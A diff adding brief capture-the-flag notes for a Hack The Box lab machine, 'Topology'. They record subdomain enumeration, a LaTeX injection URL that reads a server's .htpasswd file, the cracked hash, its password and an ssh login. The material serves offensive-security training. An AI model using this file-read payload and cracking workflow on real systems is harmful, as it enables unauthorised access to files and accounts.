@@ -1,0 +1,27 @@
+10.129.102.248
+[
+	gobuster::: 
+		dev.topology.htb Status: 401 [Size: 463]
+
+	wfuzz::: 
+		401  14 L  54 W  463 Ch   "dev"
+	
+	firefox::: 
+							http://latex.topology.htb/equation.php?eqn=%24\lstinputlisting{/var/www/dev/.htpasswd}%24&submit=
+
+		vdaisley:$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0
+
+		echo 'vdaisley:$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0' > ./hash
+
+	hashcat::: hashcat hash /usr/share/wordlists/rockyou.txt --user
+
+		$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0:calculus20
+										calculus20    ....<<< 
+
+	### ###
+
+	ssh:::
+		ssh vdaisley@$(mvnb)
+		
+
+]
